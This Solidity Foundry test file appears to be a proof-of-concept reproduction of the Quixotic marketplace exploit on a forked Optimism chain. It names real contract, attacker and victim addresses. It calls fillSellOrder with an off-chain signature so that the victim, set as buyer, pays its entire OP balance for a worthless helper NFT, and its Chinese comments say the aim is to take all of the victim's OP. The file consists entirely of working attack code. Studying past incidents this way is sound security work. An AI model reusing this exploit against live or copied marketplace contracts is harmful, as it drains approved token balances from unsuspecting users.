pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";
import "./NFTContract.sol";
//https://www.levi104.com/categories/08-PoC/
contract Attacker is Test {

    NFTContract public nftHelper;
    IQuixotic public quixotic = IQuixotic(address(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6));
    IERC20 public op = IERC20(0x4200000000000000000000000000000000000042);

    address public attacker = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
    address public victim = 0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B;

     function setUp() public {
        vm.createSelectFork("optimism", 13_591_382);
        nftHelper = new NFTContract();

        vm.label(address(nftHelper), "nftHelper");
        vm.label(address(quixotic), "quixotic");
        vm.label(address(op), "op");
    }

    function test_Exploit() public {

        emit log_named_uint("[Before] attacker OP Balance:", op.balanceOf(attacker));
        vm.startBroadcast(attacker);
        uint256 victimBalance = op.balanceOf(victim);

        quixotic.fillSellOrder(
            address(attacker), // seller
            address(nftHelper), // contractAddress
            uint256(1), // tokenId
            uint256(1), // startTime
            uint256(9999999999999999999999999999999999999999), // expiration
            uint256(victimBalance), // price, 黑客需要知道受害者拥有多少op，全部取走
            uint256(1), // quantity
            uint256(1), // createdAtBlockNumber
            address(0x4200000000000000000000000000000000000042), // paymentERC20
            // 这个签名需要到链下进行，计算过程放到了calSignature.sol中
            hex"ed60c44be131f7252ba5b53a3a56ab340a5231c122f454e37fed4302a4ae5568191eee46f491eefd3c0aeb895f9045ded4c55194e204647a78528e34085b9ef81b", // signature
            address(victim) // buyer，受害者
        );

        vm.stopBroadcast();

        emit log_named_uint("[after] attacker OP Balance:", op.balanceOf(attacker));
    }

   
}